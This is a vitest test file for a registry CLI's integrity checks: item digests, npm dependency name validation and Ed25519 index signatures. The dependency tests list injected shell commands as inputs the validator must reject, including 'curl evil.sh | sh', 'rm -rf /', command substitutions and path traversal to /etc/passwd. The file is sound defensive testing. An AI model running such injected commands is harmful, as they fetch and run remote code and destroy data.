import { describe, expect, it } from 'vitest';
import crypto from 'crypto';
import {
  computeItemDigest,
  isSafeNpmDependency,
  verifyIndexSignature,
  TRUSTED_SIGNING_KEYS,
} from './integrity';

/**
 * Shared with scripts/registry-digest.js. If this vector changes, already
 * released CLIs will reject every item the next registry build publishes —
 * ship a CLI release before deploying the registry.
 */
const PARITY_ITEM = {
  name: 'button',
  files: [
    { name: 'button.directive.ts', content: 'export const a = 1;\n' },
    { name: 'index.ts', content: "export * from './button.directive';\n" },
  ],
};
const PARITY_DIGEST = 'dc7e039b6f39bad0dc2d0153ee2c8d0103ff18ccf84e7c92cbce9feed6a73e64';

describe('computeItemDigest', () => {
  it('matches the vector pinned in scripts/registry-digest.js', () => {
    expect(computeItemDigest(PARITY_ITEM)).toBe(PARITY_DIGEST);
  });

  it('ignores file ordering', () => {
    const reversed = { ...PARITY_ITEM, files: [...PARITY_ITEM.files].reverse() };
    expect(computeItemDigest(reversed)).toBe(PARITY_DIGEST);
  });

  it('changes when any file content changes', () => {
    const tampered = {
      ...PARITY_ITEM,
      files: [{ ...PARITY_ITEM.files[0], content: 'export const a = 2;\n' }, PARITY_ITEM.files[1]],
    };
    expect(computeItemDigest(tampered)).not.toBe(PARITY_DIGEST);
  });

  it('changes when a file is renamed', () => {
    const renamed = {
      ...PARITY_ITEM,
      files: [{ ...PARITY_ITEM.files[0], name: 'evil.ts' }, PARITY_ITEM.files[1]],
    };
    expect(computeItemDigest(renamed)).not.toBe(PARITY_DIGEST);
  });

  it('cannot be spoofed by moving content across the name/content boundary', () => {
    const a = computeItemDigest({ name: 'x', files: [{ name: 'ab', content: 'c' }] });
    const b = computeItemDigest({ name: 'x', files: [{ name: 'a', content: 'bc' }] });
    expect(a).not.toBe(b);
  });
});

describe('isSafeNpmDependency', () => {
  it('accepts real package names', () => {
    for (const dep of ['@angular/cdk', 'clsx', 'tailwind-merge', 'rxjs', 'lucide-angular']) {
      expect(isSafeNpmDependency(dep)).toBe(true);
    }
  });

  it('rejects shell metacharacters and flags', () => {
    for (const dep of [
      'clsx; curl evil.sh | sh',
      'clsx && rm -rf /',
      '$(whoami)',
      '`id`',
      '--registry=http://evil.test',
      '../../etc/passwd',
      'file:/tmp/evil',
      'http://evil.test/pkg.tgz',
      'clsx@$(id)',
    ]) {
      expect(isSafeNpmDependency(dep)).toBe(false);
    }
  });
});

describe('verifyIndexSignature', () => {
  const raw = '[{"name":"button"}]';

  function signWith(content: string) {
    const { publicKey, privateKey } = crypto.generateKeyPairSync('ed25519');
    const publicDer = publicKey.export({ format: 'der', type: 'spki' }).toString('base64');
    const keyId = crypto.createHash('sha256').update(publicDer).digest('hex').slice(0, 16);
    return {
      keyId,
      publicDer,
      sig: {
        alg: 'ed25519',
        keyId,
        sha256: crypto.createHash('sha256').update(content, 'utf8').digest('hex'),
        signature: crypto.sign(null, Buffer.from(content, 'utf8'), privateKey).toString('base64'),
      },
    };
  }

  function withTrustedKey<T>(keyId: string, publicKey: string, fn: () => T): T {
    TRUSTED_SIGNING_KEYS.push({ keyId, publicKey });
    try {
      return fn();
    } finally {
      TRUSTED_SIGNING_KEYS.length = 0;
    }
  }

  it('reports unsigned when the CLI ships no trusted key', () => {
    expect(verifyIndexSignature(raw, undefined).status).toBe('unsigned');
  });

  it('verifies a signature made by a trusted key', () => {
    const { keyId, publicDer, sig } = signWith(raw);
    withTrustedKey(keyId, publicDer, () => {
      expect(verifyIndexSignature(raw, sig)).toEqual({ status: 'verified', keyId });
    });
  });

  it('rejects an index whose bytes changed after signing', () => {
    const { keyId, publicDer, sig } = signWith(raw);
    withTrustedKey(keyId, publicDer, () => {
      const verdict = verifyIndexSignature('[{"name":"backdoor"}]', sig);
      expect(verdict.status).toBe('invalid');
    });
  });

  it('rejects a valid signature from an untrusted key', () => {
    const trusted = signWith(raw);
    const attacker = signWith(raw);
    withTrustedKey(trusted.keyId, trusted.publicDer, () => {
      expect(verifyIndexSignature(raw, attacker.sig).status).toBe('invalid');
    });
  });

  it('rejects a forged sha256 that matches tampered content', () => {
    const { keyId, publicDer, sig } = signWith(raw);
    const tampered = '[{"name":"backdoor"}]';
    withTrustedKey(keyId, publicDer, () => {
      const verdict = verifyIndexSignature(tampered, {
        ...sig,
        sha256: crypto.createHash('sha256').update(tampered, 'utf8').digest('hex'),
      });
      expect(verdict.status).toBe('invalid');
    });
  });

  it('rejects a missing signature when a trusted key is present', () => {
    const { keyId, publicDer } = signWith(raw);
    withTrustedKey(keyId, publicDer, () => {
      expect(verifyIndexSignature(raw, undefined).status).toBe('unsigned');
      expect(verifyIndexSignature(raw, { alg: 'ed25519' }).status).toBe('invalid');
    });
  });
});
